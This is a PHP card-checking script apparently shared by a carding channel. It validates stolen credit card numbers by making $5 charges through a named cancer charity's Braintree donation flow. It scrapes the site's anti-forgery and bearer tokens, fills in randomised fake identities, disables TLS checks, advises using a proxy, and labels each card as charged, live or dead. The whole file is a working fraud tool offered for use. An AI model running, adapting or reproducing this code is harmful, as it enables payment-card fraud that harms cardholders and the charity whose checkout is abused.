<?php

#/// API Made By: @anonmous000 aka 🏴‍☠🃏A000🃏🏴‍☠
#/// Channel & Chat: @BinBhai & @BinBhaiFamily | 🏴‍☠️【Bв™】
#/// Rest API
#/// Gate: [Braintree Charge $5.00]
#/// Total Requests: [03]
#/// Site Type: [DONATION]
#/// Site: [https://donate.cancer.org/]
#/// Use Proxy/VPN Enjoy_xD...!!!

#---///Credits\\\---#

$credits = "[☠️【★Bв™】Bin Bhai]"; /// PUT YOUR NAME

#---///[I Am Using ProxyLess Checker Here]\\\---#

error_reporting(0);
set_time_limit(0);
date_default_timezone_set('America/Buenos_Aires');
$dateTime = date('D M d Y H:i:s \G\M\TO (T)');
$dateTime = date('O');
$hours = intval($dateTime) / 100;
$minutes = intval($dateTime) % 100;
$timeOffset = $hours * 60 + $minutes;
$timezoneOffset = date('P');
$SigndateTime = gmdate('Y-m-d\TH:i:s\Z');
$correlationId = uniqid();

#---///[START]\\\---#

if (file_exists(getcwd().('/cookie.txt'))){@unlink('cookie.txt');};

#---///A [0-0-0]\\\---#

function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function Braintree($data = 36){
    return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);
};

$ssid = Braintree();
$uuid = Braintree();

$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (empty($lista)) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-warning">『 ★ Bete Enter Your CC First ★ 』</i></font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
    die();
};

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

#---///Random Personal Details\\\---#

$name   = ucfirst(str_shuffle('ashish'));
$last    = ucfirst(str_shuffle('mishra'));
$com     = ucfirst(str_shuffle('binbhaifamily'));
$mail   = "binbhai".substr(md5(uniqid()),0,8)."@telegmail.com";
$street = "".rand(0000,9999)."+Main+Street";
$ph      = array("682","346","246");
$ph1     = array_rand($ph);
$phh     = $ph[$ph1];
$phone   = "$phh".rand(0000000,9999999)."";
$st      = array("AL","NY","CA","FL","WA");
$st1     = array_rand($st);
$state   = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip   = "10080";
$city  = "New+York";
}
elseif ($state == "WA"){
$state = "Washington";
$zip   = "98001";
$city  = "Auburn";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip   = "35005";
$city  = "Adamsville";
}
elseif ($state == "FL"){
$state = "Florida";
$zip   = "32003";
$city  = "Orange+Park";
}else{
$state = "California";
$zip   = "90201";
$city  = "Bell";
};

$User_Agent = 'Mozilla/5.0 (Windows NT '.rand(11, 99).'.0; Win64; x64) AppleWebKit/'.rand(111, 999).'.'.rand(11, 99).' (KHTML, like Gecko) Chrome/'.rand(11, 99).'.0.'.rand(1111, 9999).'.'.rand(111, 999).' Safari/'.rand(111, 999).'.'.rand(11, 99).'';

#---///1st Request [Donation Site>>>GET METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.cancer.org/');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: donate.cancer.org',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
'Accept-Language: en-GB,en;q=0.5',
'Sec-Fetch-Site: none',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Dest: document',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
$result1 = curl_exec($ch);
$time1 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Xsrf_Token = getStr($result1, 'name="x-antiforgery-token" content="','"');
$encodedbearer = getstr($result1, "authorization: '","'");
#-----[Decode & Capture Authorization Bearer From Encoded Bearer]-----#
$decode = base64_decode($encodedbearer);
$Bearer = getstr($decode, '"authorizationFingerprint":"','",');

#---///2nd Request [Authorizing Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: payments.braintree-api.com',
'accept: */*',
'accept-language: en-GB,en;q=0.9',
'authorization: Bearer '.$Bearer.'',
'braintree-version: 2018-05-10',
'content-type: application/json',
'origin: https://assets.braintreegateway.com',
'referer: https://assets.braintreegateway.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.$ssid.'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"'.$name.' '.$last.'","billingAddress":{"countryCodeAlpha2":"US","extendedAddress":"","locality":"'.$city.'","region":"'.$state.'","firstName":"'.$name.'","lastName":"'.$last.'","postalCode":"'.$zip.'","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
$result2 = curl_exec($ch);
$time2 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Token = getStr($result2, '"token":"','"');

#---///3rd Request [Charging Credit Card]>>>POST METHOD<<<\\\---#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://donate.cancer.org/process');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: donate.cancer.org',
'X-XSRF-TOKEN: '.$Xsrf_Token.'',
'Content-Type: application/json',
'Accept: */*',
'X-Requested-With: XMLHttpRequest',
'Accept-Language: en-GB,en;q=0.5',
'Origin: https://donate.cancer.org',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://donate.cancer.org/',
'user-agent: '.$User_Agent.'',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"amount":"5.00","fingerprintId":"{\"correlation_id\":\"'.$correlationId.'\"}","firstName":"'.$name.'","lastName":"'.$last.'","street1":"'.$street.'","street2":"","city":"'.$city.'","state":"'.$state.'","zip":"'.$zip.'","country":"US","email":"'.$mail.'","nonce":"'.$Token.'","inputs":{"transaction_uuid":"'.$uuid.'","signed_date_time":"'.$SigndateTime.'","transaction_type":"sale","reference_number":"","campaign":"default","locale":"en","currency":"USD","payment_method":"card","card_type":"","card":"","amount":"5.00","recurring_automatic_renew":"false","recurring_amount":"","recurring_frequency":"","recurring_start_date":"","bill_to_forename":"'.$name.'","bill_to_surname":"'.$last.'","bill_to_email":"'.$mail.'","bill_to_phone":"","bill_to_address_line1":"'.$street.'","bill_to_address_line2":"","bill_to_address_city":"'.$city.'","bill_to_address_country":"US","bill_to_address_state":"'.$state.'","bill_to_address_postal_code":"'.$zip.'","client_datetime":"'.$dateTime.'","client_timeoffset":"'.$timeOffset.'","employer_name":"","employer_id":"","honoree_data":"{\"honoreeSelection\":{\"enabled\":false}}","suppression_by_email_required":"false","tracking_enabled":"false","timezone_offset":"'.$timezoneOffset.'","corporate_name":"","recognition":""},"urlKey":"default","paymentMethod":"card"}');
$result = curl_exec($ch);
$time3 = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
curl_close($ch);

$Respo = getStr($result,'"reasonCode":"','"');

#------------[Last REQ Response]------------#

$took = $time0 + $time1 + $time2 + $time3;
$time = round($took, 4);

#-----[CVV [CHARGED] Response]-----#

if ((strpos($result, 'approved":true')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Aprovadas </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV Charged $5.00 | [Approved] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV AVS Failed Response]-----#

elseif (strpos($result, 'Gateway Rejected: avs')){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Ccn </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CVV Insufficient Funds Response]-----#

elseif (strpos($result,"Insufficient Funds")){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Ccn </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CVV MATCHED | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[CCN Response]-----#

elseif (strpos($result,"Card Issuer Declined CVV")){
echo '<font size=3.5 color="white"><font class="badge badge-success">#Ccn </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『 ★ CCN LIVE | ['.$Respo.'] ★ 』 </font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

#-----[DEAD Response]-----#

elseif (strpos($result, $Respo)){
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | ['.$Respo.'] ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';
}

else {
echo '<font size=3.5 color="white"><font class="badge badge-danger">#Reprovadas </i></font> <font class="badge badge-secondary"> '.$lista.' </i></font><font size=3.5 color="red"> <font class="badge badge-warning">『 ★ Declined | Try Again or Contact To Host To Fix This..! @BinBhai ★ 』</i></font> <font class="badge badge-secondary"> Time Taken: '.$time.'s</font> <font class="badge badge-secondary"> Gate: Braintree Charge $5.00</font> <font class="badge badge-secondary"> Checker Made By: '.$credits.'</font><br></br>';

}


//echo "<br><b>1:</b> $result1<br><br>";
//echo "<br><b>2:</b> $result2<br><br>";
//echo "<br><b>3:</b> $result<br><br>";
//echo "<br><b>XSRF TOKEN:</b> $Xsrf_Token<br><br>";
//echo "<br><b>AUTHORIZATION BEARER:</b> $Bearer<br><br>";
//echo "<br><b>TOKEN:</b> $Token<br><br>";
//echo "<br><b>RESPONSE:</b> $Respo<br><br>";

curl_close($ch);
ob_flush();

#---///[THE END]\\\---#

sleep(1);

?>